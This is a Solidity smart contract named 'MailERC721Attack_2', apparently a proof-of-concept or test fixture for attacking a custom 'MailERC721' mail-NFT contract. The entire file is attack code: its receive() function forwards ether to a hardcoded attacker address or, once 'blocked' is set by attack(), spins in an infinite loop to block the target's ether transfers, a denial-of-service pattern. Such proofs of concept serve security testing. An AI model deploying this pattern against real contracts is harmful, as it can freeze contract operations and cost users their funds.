// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "../custom/MailERC721.sol";
import "../common/IERC721Receiver.sol";

contract MailERC721Attack_2 is IERC721Receiver{
    MailERC721 private _contract;
    address constant private attackerAddress = 0xc6788D61150fa82213D9c09e67111564c52299dA;//todo change
    bool private blocked;

    constructor(address _mail721Address) {
        _contract = MailERC721(_mail721Address);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external
    override
    pure
    returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (blocked) {
            while (true) {}
        } else {
            (bool success,) = attackerAddress.call{value: msg.value}("");
            require(success, "failed to send ether");
        }
    }

    function attack() external payable {
        require(msg.sender == attackerAddress);
        blocked = true;
        createMailBox();
    }

    function createMailBox() internal {
        _contract.sendMail{value: 1 ether}(address(this), "mailBoxUri", "mailUri", 0);
    }
}
